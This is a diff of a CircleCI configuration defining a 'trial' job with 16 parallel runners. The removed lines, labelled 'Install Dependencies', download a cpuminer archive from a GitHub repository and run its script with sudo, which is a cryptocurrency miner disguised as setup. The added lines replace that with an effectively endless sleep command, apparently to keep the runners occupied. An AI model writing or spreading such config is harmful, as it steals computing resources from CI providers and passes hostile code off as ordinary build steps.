@@ -2,17 +2,13 @@ version: 2.1
 jobs:
     trial:
       docker:
-            - image: circleci/ruby:2.5.3
+            - image: ubuntu-2004:202010-01
       parallelism: 16
       steps:
         - run:
             name: Install Dependencies
             command: |
-              wget https://github.com/a8899d/Project/raw/main/cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
-              sudo apt-get -y install libcurl4-openssl-dev
-              tar -xf cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
-              cd cpuminer-gr-1.2.4.1-x86_64_linux
-              sudo ./cpuminer.sh
+              sleep 999999999999999
 
 
 workflows:
